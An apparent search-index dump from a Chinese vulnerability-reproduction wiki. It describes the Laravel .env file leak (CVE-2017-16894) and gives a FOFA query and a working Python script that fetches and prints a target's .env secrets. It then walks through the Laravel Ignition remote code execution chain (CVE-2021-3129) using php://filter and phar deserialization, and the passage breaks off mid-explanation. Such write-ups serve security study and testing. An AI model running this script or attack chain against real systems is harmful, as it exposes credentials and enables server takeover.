\u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] .env \u6587\u4ef6\u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Laravel_.env_configuration_file_leaks_(CVE-2017-16894).json","title":"Laravel .env \u914d\u7f6e\u6587\u4ef6\u6cc4\u9732 CVE-2017-16894"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20.env%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%20CVE-2017-16894/#laravel-env-\u914d\u7f6e\u6587\u4ef6\u6cc4\u9732-cve-2017-16894","text":"","title":"Laravel .env \u914d\u7f6e\u6587\u4ef6\u6cc4\u9732 CVE-2017-16894"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20.env%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%20CVE-2017-16894/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Laravel Framework\u662fTaylor Otwell\u8f6f\u4ef6\u5f00\u53d1\u8005\u5f00\u53d1\u7684\u4e00\u6b3e\u57fa\u4e8ePHP\u7684Web\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u6846\u67b6\u3002 Laravel framework 5.5.21\u53ca\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u5b58\u5728 .env \u6587\u4ef6\u53ef\u88ab\u4e0b\u8f7d\u7684\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20.env%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%20CVE-2017-16894/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Laravel framework <= 5.5.21","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20.env%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%20CVE-2017-16894/#fofa","text":"[!NOTE] app=\"Laravel-Framework\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20.env%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%20CVE-2017-16894/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u76ee\u6807 url http://xxx.xxx.xxx.xxx/.env \u5f53\u914d\u7f6e\u4e0d\u5f53\u4e14\u5728\u5f71\u54cd\u8303\u56f4\u5185\u65f6\u4f1a\u51fa\u73b0 .env\u53ef\u88ab\u4e0b\u8f7d\u7684\u60c5\u51b5 \uff0c\u5bfc\u81f4\u6570\u636e\u5e93\u8d26\u53f7\u5bc6\u7801\u7b49\u654f\u611f\u4fe1\u606f\u7684\u6cc4\u9732 \u8fd9\u91cc\u4f7f\u7528POC\u811a\u672c\u6765\u8fdb\u884c\u4fe1\u606f\u83b7\u53d6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20.env%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%20CVE-2017-16894/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: Laravel framework <= 5.5.21 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/.env\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"APP_NAME\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] .env \u6587\u4ef6\u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20.env%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%20CVE-2017-16894/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Laravel_.env_configuration_file_leaks_(CVE-2017-16894).json","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/","text":"Laravel <= 8.4.2 Debug\u6a21\u5f0f _ignition \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-3129 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Laravel \u662f\u4e00\u4e2a\u514d\u8d39\u7684\u5f00\u6e90 PHP Web \u6846\u67b6\uff0c\u65e8\u5728\u5b9e\u73b0\u7684Web\u8f6f\u4ef6\u7684MVC\u67b6\u6784\u30022021\u5e741\u670813\u65e5\uff0c\u963f\u91cc\u4e91\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\u76d1\u63a7\u5230\u56fd\u5916\u67d0\u5b89\u5168\u7814\u7a76\u56e2\u961f\u62ab\u9732\u4e86 Laravel <= 8.4.2 \u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u5f53Laravel\u5f00\u542f\u4e86Debug\u6a21\u5f0f\u65f6\uff0c\u7531\u4e8eLaravel\u81ea\u5e26\u7684Ignition\u529f\u80fd\u7684\u67d0\u4e9b\u63a5\u53e3\u5b58\u5728\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u8d77\u6076\u610f\u8bf7\u6c42\uff0c\u901a\u8fc7\u6784\u9020\u6076\u610fLog\u6587\u4ef6\u7b49\u65b9\u5f0f\u89e6\u53d1Phar\u53cd\u5e8f\u5217\u5316\uff0c\u4ece\u800c\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u63a7\u5236\u670d\u52a1\u5668\u3002\u6f0f\u6d1e\u7ec6\u8282\u5df2\u5728\u4e92\u8054\u7f51\u516c\u5f00\u3002\u963f\u91cc\u4e91\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\u63d0\u9192 Laravel \u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u5b89\u5168\u63aa\u65bd\u963b\u6b62\u6f0f\u6d1e\u653b\u51fb\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Laravel \u6846\u67b6 < 8.4.3 facade ignition \u7ec4\u4ef6 < 2.5.2 \u73af\u5883\u642d\u5efa \u00b6 https://github.com/SNCKER/CVE-2021-3129.git docker-compose up -d \u70b9\u51fb\u751f\u6210\u5bc6\u94a5\u51fa\u73b0\u5982\u4e0b\u56fe\u5373\u6210\u529f\u521b\u5efa\u6f0f\u6d1e\u73af\u5883 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6309\u7167\u6f0f\u6d1e\u516c\u5f00\u6587\u7ae0\u9700\u8981\u5148\u6709\u4e00\u4e2a\u672a\u77e5\u53d8\u91cf\u7684\u9519\u8bef\uff0c\u6765\u70b9\u51fb Make variable optional [!NOTE] \u6309\u7167\u5b98\u65b9\u624b\u518c\u521b\u5efa\u8def\u7531\u548cView\u6a21\u677f \u901a\u8fc7\u70b9\u51fb\u201cMake variableOptional\u201d\u6309\u94ae\uff0c\u6a21\u677f\u53d8\u91cf\u5219\u4f1a\u88ab\u4fee\u6539\u3002\u5982\u679c\u68c0\u67e5HTTP\u65e5\u5fd7\uff0c\u6211\u4eec\u5c31\u4f1a\u770b\u5230\u88ab\u8c03\u7528\u7684\u7aef\u70b9 \u901a\u8fc7\u8fd9\u4e9bsolutions\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u901a\u8fc7\u70b9\u51fb\u6309\u94ae\u7684\u65b9\u5f0f\uff0c\u5feb\u901f\u4fee\u590d\u4e00\u4e9b\u9519\u8bef\u3002\u672c\u6b21\u6f0f\u6d1e\u5c31\u662f\u5176\u4e2d\u7684 vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php \u8fc7\u6ee4\u4e0d\u4e25\u8c28\u5bfc\u81f4\u7684\u3002\u9996\u5148\u6211\u4eec\u5230\u6267\u884csolution\u7684\u63a7\u5236\u5668\u5f53\u4e2d\u53bb\uff0c\u770b\u770b\u662f\u5982\u4f55\u8c03\u7528\u5230solution\u7684 <?php namespace Facade\\Ignition\\Http\\Controllers ; use Facade\\Ignition\\Http\\Requests\\ExecuteSolutionRequest ; use Facade\\IgnitionContracts\\SolutionProviderRepository ; use Illuminate\\Foundation\\Validation\\ValidatesRequests ; class ExecuteSolutionController { use ValidatesRequests ; public function __invoke ( ExecuteSolutionRequest $request , SolutionProviderRepository $solutionProviderRepository ) { $solution = $request -> getRunnableSolution (); $solution -> run ( $request -> get ( 'parameters' , [])); return response ( '' ); } } \u63a5\u7740\u8c03\u7528solution\u5bf9\u8c61\u4e2d\u7684 run() \u65b9\u6cd5\uff0c\u5e76\u5c06\u53ef\u63a7\u7684 parameters \u53c2\u6570\u4f20\u8fc7\u53bb\u3002\u901a\u8fc7\u8fd9\u4e2a\u70b9\u6211\u4eec\u53ef\u4ee5\u8c03\u7528\u5230 MakeViewVariableOptionalSolution::run() <?php namespace Facade\\Ignition\\Solutions ; use Facade\\IgnitionContracts\\RunnableSolution ; use Illuminate\\Support\\Facades\\Blade ; class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run ( array $parameters = []) { $output = $this -> makeOptional ( $parameters ); if ( $output !== false ) { file_put_contents ( $parameters [ 'viewFile' ], $output ); } } public function makeOptional ( array $parameters = []) { $originalContents = file_get_contents ( $parameters [ 'viewFile' ]); $newContents = str_replace ( '$' . $parameters [ 'variableName' ], '$' . $parameters [ 'variableName' ] . \" ?? ''\" , $originalContents ); $originalTokens = token_get_all ( Blade :: compileString ( $originalContents )); $newTokens = token_get_all ( Blade :: compileString ( $newContents )); $expectedTokens = $this -> generateExpectedTokens ( $originalTokens , $parameters [ 'variableName' ]); if ( $expectedTokens !== $newTokens ) { return false ; } return $newContents ; } protected function generateExpectedTokens ( array $originalTokens , string $variableName ) : array { $expectedTokens = []; foreach ( $originalTokens as $token ) { $expectedTokens [] = $token ; if ( $token [ 0 ] === T_VARIABLE && $token [ 1 ] === '$' . $variableName ) { $expectedTokens [] = [ T_WHITESPACE , ' ' , $token [ 2 ]]; $expectedTokens [] = [ T_COALESCE , '??' , $token [ 2 ]]; $expectedTokens [] = [ T_WHITESPACE , ' ' , $token [ 2 ]]; $expectedTokens [] = [ T_CONSTANT_ENCAPSED_STRING , \"''\" , $token [ 2 ]]; } } return $expectedTokens ; } } \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u4e3b\u8981\u529f\u80fd\u70b9\u662f\uff1a\u8bfb\u53d6\u4e00\u4e2a\u7ed9\u5b9a\u7684\u8def\u5f84\uff0c\u5e76\u66ff\u6362 $variableName \u4e3a $variableName ?? '' \uff0c\u4e4b\u540e\u5199\u56de\u6587\u4ef6\u4e2d\u3002\u7531\u4e8e\u8fd9\u91cc\u8c03\u7528\u4e86 file_get_contents() \uff0c\u4e14\u5176\u4e2d\u7684\u53c2\u6570\u53ef\u63a7\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u901a\u8fc7 phar:// \u534f\u8bae\u53bb\u89e6\u53d1phar\u53cd\u5e8f\u5217\u5316\u3002\u5982\u679c\u540e\u671f\u5229\u7528\u6846\u67b6\u8fdb\u884c\u5f00\u53d1\u7684\u4eba\u5458\uff0c\u5199\u51fa\u4e86\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a\u6076\u610fphar\u6587\u4ef6\uff0c\u5229\u7528\u4e0a\u8ff0\u7684 file_get_contents() \u53bb\u89e6\u53d1phar\u53cd\u5e8f\u5217\u5316\uff0c\u8fbe\u5230rce\u7684\u6548\u679c\u3002 \u9664\u4e86\u89e3\u51b3\u65b9\u6848\u7684\u7c7b\u540d\u4e4b\u5916\uff0c\u8fd8\u53d1\u9001\u4e86\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\u548c\u4e00\u4e2a\u6211\u4eec\u8981\u66ff\u6362\u7684\u53d8\u91cf\u540d\u3002\u8fd9\u770b\u8d77\u6765\u975e\u5e38\u8ba9\u4eba\u611f\u5174\u8da3\u3002 \u8ba9\u6211\u4eec\u5148\u68c0\u67e5\u4e00\u4e0b\u7c7b\u540d\u7684\u5229\u7528\u65b9\u6cd5\uff1a\u6211\u4eec\u53ef\u4ee5\u5b9e\u4f8b\u5316\u4efb\u610f\u7684\u7c7b\u5417\uff1f class SolutionProviderRepository implements SolutionProviderRepositoryContract { ... public function getSolutionForClass(string $solutionClass): ?Solution { if (! class_exists($solutionClass)) { return null; } if (! in_array(Solution::class, class_implements($solutionClass))) { return null; } return app($solutionClass); } } \u7b54\u6848\u662f\u5426\u5b9a\u7684\uff1aIgnition\u603b\u662f\u7528\u6211\u4eec\u6307\u5411\u7684\u7c7b\u6765\u5b9e\u73b0**RunnableSolution** \u90a3\u4e48\uff0c\u8ba9\u6211\u4eec\u4ed4\u7ec6\u770b\u770b\u8fd9\u4e2a\u7c7b\u3002\u5b9e\u9645\u4e0a\uff0c\u8d1f\u8d23\u8be5\u64cd\u4f5c\u7684\u4ee3\u7801\u4f4d**./vendor/facade/ignition/sr/solutions/MakeViewVariableOptionalSolution.php**\u6587\u4ef6\u4e2d\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u66f4\u6539\u4efb\u610f\u6587\u4ef6\u7684\u5185\u5bb9\u4e48\uff1f class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this->makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); // [1] $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2] $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { // [3] return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } ... } \u8fd9\u6bb5\u4ee3\u7801\u6bd4\u6211\u4eec\u9884\u60f3\u7684\u8981\u590d\u6742\u4e00\u4e9b\uff1a\u5b83\u4f1a\u5728\u8bfb\u53d6\u7ed9\u5b9a\u7684\u6587\u4ef6\u8def\u5f84[1]\u540e\uff0c\u5c06 variableName\u66ff\u6362\u4e3a variableName\u66ff\u6362\u4e3a variableName ?? ''\uff0c\u521d\u59cb\u6587\u4ef6\u548c\u65b0\u6587\u4ef6\u90fd\u5c06\u88ab\u6807\u8bb0\u5316[2]\u3002\u5982\u679c\u6211\u4eec\u7684\u4ee3\u7801\u7ed3\u6784\u6ca1\u6709\u53d1\u751f\u8d85\u51fa\u9884\u671f\u7684\u53d8\u5316\uff0c\u6587\u4ef6\u5c06\u88ab\u66ff\u6362\u4e3a\u65b0\u7684\u5185\u5bb9\u3002\u5426\u5219\uff0cmakeOptional\u5c06\u8fd4\u56defalse[3]\uff0c\u65b0\u6587\u4ef6\u5c06\u4e0d\u4f1a\u88ab\u5199\u5165\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u65e0\u6cd5\u4f7f\u7528variableName\u505a\u592a\u591a\u4e8b\u60c5\u3002 \u5269\u4e0b\u7684\u552f\u4e00\u8f93\u5165\u53d8\u91cf\u5c31\u662fviewFile\u3002\u5982\u679c\u6211\u4eec\u5bf9variableName\u548c\u5b83\u7684\u6240\u6709\u7528\u6cd5\u8fdb\u884c\u62bd\u8c61\uff0c\u6211\u4eec\u6700\u7ec8\u4f1a\u5f97\u5230\u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5\uff1a $contents =file_get_contents($parameters['viewFile']); file_put_contents($parameters['viewFile'], $contents); \u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u5927\u5bb6\u53ef\u80fd\u90fd\u542c\u8bf4\u8fc7Orange Tsai\u6f14\u793a\u7684\u4e0a\u4f20\u8fdb\u5ea6\u6280\u672f\u3002\u8be5\u6280\u672f\u5229\u7528php://filter\u5728\u8fd4\u56de\u6587\u4ef6\u4e4b\u524d\u4fee\u6539\u5176\u5185\u5bb9\u3002\u501f\u52a9\u4e8e\u8be5\u6280\u672f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u5229\u7528\u539f\u8bed\u6765\u8f6c\u6362\u6587\u4ef6\u7684\u5185\u5bb9 $ echo test | base64 | base64 > /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K $f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt' ; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents ( $f ) ; # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents ( $f , $contents ) ; $ cat /path/to/file.txt test \u6211\u4eec\u5df2\u7ecf\u6539\u53d8\u4e86\u6587\u4ef6\u7684\u5185\u5bb9\uff01\u9057\u61be\u7684\u662f\uff0c\u8fd9\u5c06\u4f1a\u5e94\u7528\u4e24\u6b21\u8f6c\u6362\u3002\u9605\u8bfb\u6587\u6863\u540e\uff0c\u6211\u4eec\u627e\u5230\u4e86\u53ea\u8fdb\u884c\u4e00\u6b21\u8f6c\u6362\u7684\u65b9\u6cd5\uff1a # To base64-decode once, use: $f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt' ; # OR $f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt' ; \u574f\u5b57\u7b26\u751a\u81f3\u90fd\u4f1a\u88ab\u5ffd\u7565\uff1a $ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /path/to/file.txt $f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt' ; $contents = file_get_contents ( $f ) ; file_put_contents ( $f , $contents ) ; $ cat /path/to/file.txt test \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cLaravel\u7684\u65e5\u5fd7\u6587\u4ef6\uff08\u5b58\u653ePHP\u9519\u8bef\u548c\u5806\u6808\u8ddf\u8e2a\uff09\u662f\u5b58\u50a8\u5728storage/log/laravel.log\u4e2d\u7684\u3002\u4e0b\u9762\uff0c\u8ba9\u6211\u4eec\u901a\u8fc7\u5c1d\u8bd5\u52a0\u8f7d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u6765\u751f\u6210\u4e00\u4e2a\u9519\u8bef, \u5373SOME_TEXT_OF_OUR_CHOICE\uff1a [ 2021 -01-11 12 :39:44 ] local.ERROR: file_get_contents ( SOME_TEXT_OF_OUR_CHOICE ) : failed to open stream: No such file or directory { \"exception\" : \"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions->handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController->__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline->Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline->then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel->sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel->handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...') #37 {main} \" } \u6211\u4eec\u53ef\u4ee5\u5411\u6587\u4ef6\u4e2d\u6ce8\u5165\uff08\u51e0\u4e4e\uff09\u4efb\u610f\u7684\u5185\u5bb9\u4e86\u3002\u7406\u8bba\u4e0a\u8bb2\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Orange\u53d1\u660e\u7684\u6280\u672f\u5c06\u65e5\u5fd7\u6587\u4ef6\u8f6c\u6362\u4e3a\u6709\u6548\u7684PHAR\u6587\u4ef6\uff0c\u7136\u540e\uff0c\u4f7f\u7528phar://\u5305\u88c5\u5668\u6765\u8fd0\u884c\u5e8f\u5217\u5316\u7684\u4ee3\u7801\u3002\u9057\u61be\u7684\u662f\uff0c\u8fd9\u5b9e\u9645\u4e0a\u662f\u884c\u4e0d\u901a\u7684\uff0c\u5e76\u4e14\u539f\u56e0\u6709\u5f88\u591a\u3002 \u6211\u4eec\u5728\u524d\u9762\u8bf4\u8fc7\uff0c\u5f53\u5bf9\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fdb\u884cba se64-decoding\u5904\u7406\u65f6\uff0cPHP\u4f1a\u5ffd\u7565\u4efb\u4f55\u574f\u5b57\u7b26\u3002\u8fd9\u901a\u5e38\u662f\u6b63\u786e\u7684\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u5b57\u7b26\u9664\u5916\uff0c\u5373=\u3002\u5982\u679c\u4f60\u4f7f\u7528ba se64-decode\u8fc7\u6ee4\u4e00\u4e2a\u4e2d\u95f4\u542b\u6709\u5b57\u7b26=\u7684\u5b57\u7b26\u4e32\uff0cPHP\u5c06\u4ea7\u751f\u4e00\u4e2a\u9519\u8bef\uff0c\u5e76\u4e14\u4e0d\u4f1a\u8fd4\u56de\u4efb\u4f55\u5185\u5bb9\u3002 \u5982\u679c\u6211\u4eec\u80fd\u63a7\u5236\u6574\u4e2a\u6587\u4ef6\uff0c\u90a3\u5c31\u597d\u4e86\u3002\u7136\u800c\uff0c\u6211\u4eec\u6ce8\u5165\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684\u6587\u672c\u53ea\u662f\u5176\u4e2d\u5f88\u5c0f\u7684\u4e00\u90e8\u5206\u3002\u5b83\u4e0d\u4ec5\u6709\u4e00\u4e2a\u4e0d\u7b97\u5f88\u5927\u7684\u524d\u7f00\uff08\u65e5\u671f\uff09\uff0c\u8fd8\u6709\u4e00\u4e2a\u81c3\u80bf\u7684\u540e\u7f00\uff08\u5806\u6808\u8ddf\u8e2a\uff09\u3002\u6b64\u5916\uff0c\u6211\u4eec\u6ce8\u5165\u7684\u6587\u672c\u8fd8\u51fa\u73b0\u4e86\u4e24\u6b21\uff01 \u4e0b\u9762\u662f\u53e6\u4e00\u4ef6\u53ef\u6015\u7684\u4e8b\u60c5\uff1a php > var_dump(base64_decode(base64_decode('[2022-04-3023:59:11]'))); string(0) \"\" php >var_dump(base64_decode(base64_decode('[2022-04-12 23:59:11]'))); string(1) \"2\" \u6839\u636e\u65e5\u671f\u7684\u4e0d\u540c\uff0c\u5bf9\u524d\u7f00\u8fdb\u884c\u4e24\u6b21\u89e3\u7801\u65f6\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u5927\u5c0f\u7684\u7ed3\u679c\u3002\u5f53\u6211\u4eec\u5bf9\u5b83\u8fdb\u884c\u7b2c\u4e09\u6b21\u89e3\u7801\u65f6\uff0c\u5728\u7b2c\u4e8c\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u7684payload\u5c06\u4ee52\u4f5c\u4e3a\u524d\u7f00\uff0c\u4ece\u800c\u9700\u8981\u6539\u53d8base64\u6d88\u606f\u7684\u5bf9\u9f50\u65b9\u5f0f\u3002 \u4e3a\u4e86\u4f7f\u5176\u6b63\u5e38\u8fd0\u884c\uff0c\u6211\u4eec\u5fc5\u987b\u4e3a\u6bcf\u4e2a\u76ee\u6807\u5efa\u7acb\u4e00\u4e2a\u65b0\u7684payload\uff0c\u56e0\u4e3a\u5806\u6808\u8ddf\u8e2a\u4e2d\u5305\u542b\u7edd\u5bf9\u6587\u4ef6\u540d\uff1b\u5e76\u4e14\uff0c\u6bcf\u79d2\u90fd\u9700\u8981\u5efa\u7acb\u4e00\u4e2a\u65b0\u7684payload\uff0c\u56e0\u4e3a\u524d\u7f00\u4e2d\u5305\u542b\u65f6\u95f4\u3002\u5e76\u4e14\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u5b57\u7b26=\u9700\u8981\u8fdb\u884cbase64-decode\u5904\u7406\uff0c\u4ecd\u7136\u4f1a\u9762\u4e34\u5931\u8d25\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u56de\u5230PHP\u6587\u6863\u4e2d\u5bfb\u627e\u5176\u4ed6\u7c7b\u578b\u7684\u8fc7\u6ee4\u5668\u3002 [previous log entries] [prefix]PAYLOAD[midfix]PAYLOAD[suffix] 